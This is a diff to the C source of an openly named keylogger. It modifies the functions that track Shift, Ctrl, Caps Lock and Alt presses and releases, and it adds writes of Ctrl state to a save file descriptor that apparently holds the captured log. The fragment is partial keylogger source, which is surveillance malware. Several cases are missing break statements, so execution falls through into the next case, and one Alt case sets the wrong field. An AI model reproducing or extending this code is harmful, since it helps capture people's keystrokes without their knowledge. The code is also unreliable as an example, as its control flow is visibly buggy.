@@ -6,18 +6,31 @@ static int		is_mod_press(t_keylogger *klg)
 	{
 		case SHIFT_L:
 			klg->mod.shift = 1;
-            dprintf(1, "SHIFT TRUE");
 			break;
 		case SHIFT_R:
 			klg->mod.shift = 1;
-			break;
+			break ;
 		case CAPS_LOCK:
 			klg->mod.capslock = 1;
 		case CTRL_L:
 			klg->mod.ctrl = 1;
-			break;
+            dprintf(klg->saveFD, "CTRL TRUE\n");
+			break ;
 		case CTRL_R:
 			klg->mod.ctrl = 1;
+            dprintf(klg->saveFD, "CTRL TRUE\n");
+        case ALT_L:
+            klg->mod.alt = 1;
+            dprintf(1, "ALT_L TRUE\n");
+            break ;
+        case ALT_META:
+            klg->mod.alt = 1;
+            dprintf(1, "ALT_META TRUE\n");
+            break ;
+        case ALT_R:
+            klg->mod.mod = 1;
+            dprintf(1, "ALT_GR TRUE\n");
+            break ;
 		default:
 			return FALSE;
 			break;
@@ -30,7 +43,6 @@ static int		is_mod_release(t_keylogger *klg)
 	{
 		case SHIFT_L:
 			klg->mod.shift = 0;
-            dprintf(1, "SHIFT FALSE");
 			break;
 		case SHIFT_R:
 			klg->mod.shift = 0;
@@ -39,9 +51,22 @@ static int		is_mod_release(t_keylogger *klg)
 			klg->mod.capslock = 0;
 		case CTRL_L:
 			klg->mod.ctrl = 0;
+            dprintf(klg->saveFD, "CTRL FALSE\n");
 			break;
 		case CTRL_R:
 			klg->mod.ctrl = 0;
+            dprintf(klg->saveFD, "CTRL FALSE\n");
+        case ALT_L:
+            klg->mod.alt = 0;
+            dprintf(1, "ALT_L FALSE\n");
+            break;
+        case ALT_META:
+            klg->mod.alt = 0;
+            break;
+        case ALT_R:
+            dprintf(1, "ALT_GR FALSE\n");
+            klg->mod.mod = 0;
+            break ;
 		default:
 			return FALSE;
 			break;
